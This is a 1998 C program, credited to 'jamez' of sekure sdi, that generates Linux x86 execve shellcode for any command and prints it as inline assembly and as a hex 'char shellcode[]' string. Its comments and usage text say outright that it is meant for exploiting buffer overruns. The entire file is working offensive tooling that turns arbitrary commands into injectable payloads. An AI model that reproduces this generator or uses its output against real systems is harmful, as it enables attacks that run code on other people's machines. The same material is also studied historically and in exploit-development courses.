/*
 *
 * shellcode 1 - (Nov 25, 1998)
 *
 * this proggie generates a binary execve code for any commands 
 * with any arguments. it shows the asm and hex  code of execve 
 * wanted. both outputs asm and hex code can be executed on the 
 * stack. for example, you can use it when you want to  exploit
 * a buffer overrun situation on linux.
 * 
 * any comments and sugestions to jamez@sekure.org
 *
 *
 * thanks for all people from sekure sdi(www.sekure.org)
 *
 *
 */

#include <stdio.h>

#define MAX_PARAM 100



int hexcode[4086];                 /* hex code for exeve */
int hexsize = 0;                   /* size of hex code */
char asmcode[4096];                /* asm code for exeve */
char aux[1024];                    /* aux string */
char params[1024];                 /* parameters including program name */  




void asmcat(char * s) {
  strcat(asmcode, s);
}

void addasm(char * fmt, int addr) {
  sprintf(aux, fmt, addr);
  strcat(asmcode, aux);
}





void addhex(int hex) {
  hexcode[hexsize] = hex;
  hexsize++;
}

void printhex() {
  int i;
  char s[10];

  printf("\n-----------------( hex code )--\n\n");


  printf("char shellcode[] = \n");
  printf("\t\"");

  for(i = 0; i < hexsize; i++) {
    if((i - i/12 * 12) == 0 && i != 0) {
      printf("\"\n");
      printf("\t\"");
      
    }

    if(hexcode[i] < 16 && hexcode[i] >= 0)
      printf("\\x0%x", hexcode[i]);
    else 
      if(hexcode[i] > 0) 
	printf("\\x%x", hexcode[i]);
      else  {
	sprintf(s, "%x", hexcode[i]);
	printf("\\x%c", s[6]);
	printf("%c", s[7]);
      }
  }
	
  
  printf("%s\"\n", params);

}




int main(int argc, char * argv[]) {


  int i,                             /* some for's */
    jmp,                             /* how many bytes to jmp to get call instruction */
    num_params,                      /* how many parameters */
    size = 0;                        /* size of the whole command */
  
  int nulls[MAX_PARAM];              /* where the null bytes go */



    

  if(argc == 1) {
    printf("\nshellcode, first version. (Nov 25, 1998)\n\n");


    printf("  this proggie generates a binary execve code for any commands\n");;
    printf("  with any arguments. it shows the asm and hex  code of execve\n"); 
    printf("  wanted. both outputs asm and hex code can be executed on the\n");
    printf("  stack. for example, you can use it when you want to exploit\n");
    printf("  a buffer overrun situation on linux.\n\n");
  
    printf("  it's a jamez product. jamez@sekure.org\n");
    printf("  sekure sdi - www.sekure.org\n\n");


    printf(" - usage: %s path+program [first arg] [second arg] ...\n\n", argv[0]);
    exit(0);
  }


  num_params = argc - 1;
  

  /* parse out the parameters */
  params[0] = '\0';

  for(i = 0; i <  num_params && i < MAX_PARAM; i++) {    
    size += strlen(argv[i+1]) + 1;    /* plus one to the null end */
    		      
    strcat(params, argv[i + 1]);
    nulls[i] = strlen(params);    
    strcat(params, "\x20");      
  }

  params[size-1] = '\0';
  
      

  /* create the asm code */


  hexcode[0] = '\0';
  asmcode[0] = '\0';
  

  jmp = 22 + 3 + (num_params-1)*6 + 3*num_params + 3;

  addhex(0xeb);
  addhex(jmp);

  addasm("\tjmp   0x%x\n", jmp);
  

  
  addhex(0x5e);
  asmcat("\tpopl  %esi\n");         /* popl  %esi */
  
  
  /* fill char * array w/ addr's */
  for(i = 0; i <  num_params && i < MAX_PARAM; i++) {    
    if(i == 0) {
      addasm("\tmovl  %%esi,0x%x(%%esi)\n", size);
      
      addhex(0x89);
      addhex(0x76);
      addhex(size);
    }
    else {

      addhex(0x8d);
      addhex(0x5e);
      addhex(nulls[i-1]+1);

      addasm("\tleal  0x%x(%%esi),%%ebx\n", nulls[i-1]+1);

      addhex(0x89);
      addhex(0x5e);
      addhex(size + i*4);
      
      addasm("\tmovl  %%ebx,0x%x(%%esi)\n", size + i*4);
    }

  }  
  
  addhex(0x31);
  addhex(0xc0);

  asmcat("\txorl  %eax,%eax\n");


  
  /* put null at the of strings */
  for(i = 0; i <  num_params && i < MAX_PARAM; i++) {    

    addhex(0x88);
    addhex(0x46);
    addhex(nulls[i]);

    addasm("\tmovb  %%eax,0x%x(%%esi)\n", nulls[i]);       
  }  
  addhex(0x89);
  addhex(0x46);
  addhex(size + 4*num_params);  

  addasm("\tmovl  %%eax,0x%x(%%esi)\n", size + 4*num_params);



  addhex(0xb0);
  addhex(0x0b);  
  asmcat("\tmovb  $0xb,%al\n"); 


  addhex(0x89);
  addhex(0xf3);  
  asmcat("\tmovl  %esi,%ebx\n");


  addhex(0x8d);
  addhex(0x4e);  
  addhex(size);
  addasm("\tleal  0x%x(%%esi),%%ecx\n", size);  


  addhex(0x8d);  
  addhex(0x56);  
  addhex(size + 4*num_params);  
  addasm("\tleal  0x%x(%%esi),%%edx\n", size + 4*num_params);

  
  addhex(0xcd);  
  addhex(0x80);
  asmcat("\tint   $0x80\n");


  addhex(0x31);  
  addhex(0xdb);
  asmcat("\txorl  %ebx,%ebx\n");


  addhex(0x89);  
  addhex(0xd8);
  asmcat("\tmovl  %ebx,%eax\n");

  addhex(0x40);  
  asmcat("\tinc   %eax\n");


  addhex(0xcd);
  addhex(0x80);
  asmcat("\tint   $0x80\n");
  
  addhex(0xe8);
  addhex((jmp+5) * -1);
  addhex(0xff);
  addhex(0xff);
  addhex(0xff);
  addasm("\tcall  -0x%x\n", jmp+5);
  

  asmcat("\t.string \\\"");
  asmcat(params);
  asmcat("\\\"");



  printf("\n-----------------( asm code )--\n\n");

  printf("int main() {\n");
  printf("\t__asm__(\"\n");
  printf("%s\");\n", asmcode);
  printf("}\n");
  

  printhex();

  printf("\n\n(by jamez for your profit)\n\n");


}






